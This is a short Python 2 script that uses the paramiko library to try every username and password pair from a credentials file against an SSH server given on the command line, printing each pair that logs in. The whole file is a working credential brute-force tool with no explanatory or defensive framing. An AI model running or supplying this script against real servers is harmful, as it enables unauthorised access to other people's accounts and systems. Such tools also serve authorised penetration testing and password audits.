import paramiko
import sys

def sshLogin(ip,creds):
    print "[+] Trying host: {}".format(ip)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for line in open(creds, 'r').readlines():
        [username,password] = line.strip().split()

        try:
            # print "[+] Trying creds: {}:{}".format(username,password)
            ssh.connect(ip,username=username,password=password)
            print "[!] Valid creds: {}:{}".format(username,password)
        except paramiko.AuthenticationException:
            pass
            continue
        except Exception as e:
            return 0

if __name__ == "__main__":
    sshLogin(sys.argv[1],sys.argv[2])
